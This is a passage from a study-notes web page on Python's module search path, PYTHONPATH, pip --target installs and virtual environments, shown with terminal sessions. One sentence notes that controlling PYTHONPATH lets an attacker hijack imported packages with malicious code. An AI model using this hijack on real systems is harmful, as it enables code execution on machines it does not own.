+<pre><code class="language-python">d41y@htb[/htb]$ python3
+
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.path
+['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']
+
+&gt;&gt;&gt;
+</code></pre>
+<p>Now specify a <code>PYTHONPATH</code> environment variable and see how it affects the search path:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ PYTHONPATH=/tmp/ python3
+
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.path
+['', '/tmp/', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']
+
+&gt;&gt;&gt;
+</code></pre>
+<p>Since you set the <code>PYTHONPATH</code> to the root directory, this has been prepended to the search path. This means two things: first of all, the packages that exist in <code>/tmp/</code> location can now be imported and used in the project or IDLE, and secondly, it means you can highjack other packages changing the behavior. The latter point is a bonus if you can control the <code>PYTHONPATH</code> of a system to include your malicious code.</p>
+<p>Suppose you wanted to have the packages installed in a specific folder. For example, you wanted to keep all packages related to you inside some <code>/var/www/packages</code> directory. In that case, you can have pip install the package and store the content inside this folder with the <code>--target</code> flag:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3 -m pip install --target /var/www/packages/ requests
+
+Collecting requests
+  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
+Collecting urllib3&lt;1.27,&gt;=1.21.1
+  Downloading urllib3-1.26.4-py2.py3-none-any.whl (153 kB)
+     |████████████████████████████████| 153 kB 8.1 MB/s
+...SNIP...
+</code></pre>
+<h3 id="venv"><a class="header" href="#venv">venv</a></h3>
+<p>If you, for one reason or the other, need to use one specific version of a package for one project and another version of the same package for another project, you will face problems. One solution for this kind of isolation of projects is using virtual environments. The <code>venv</code> module allows you to create virtual environments for your projects, consisting of a folder structure for the project environment itself, a copy of the Python binary and files to configure your shell to work with this specific environment.</p>
+<p>Preparation:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3 -m venv academy
+</code></pre>
+<p>Next up, you can source the <code>activate</code> script located in <code>academy/bin/</code>. This configures your shell, by setting up the required environment variables so that when you run <code>pip install requests</code>, you will be using the Python binary that was copied as part of creating the venv:</p>
+<pre><code class="language-bash">Fugl@htb[/htb]$ source academy/bin/activate
+(academy) Fugl@htb[/htb]$ pip install requests
+
+Collecting requests
+  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
+Collecting idna&lt;3,&gt;=2.5
+...SNIP...
+Successfully installed certifi-2020.12.5 chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.4
+</code></pre>
+<p>Notice the <code>(academy)</code> prefix after sourcing the <code>activate</code> script. This indicates that your terminal is configured to run commands for that particular environment.<!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --></p>
+<div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
+<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2025 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../general/programming/bash.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../general/programming/python/sans573/cheatsheet.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../general/programming/bash.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../general/programming/python/sans573/cheatsheet.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
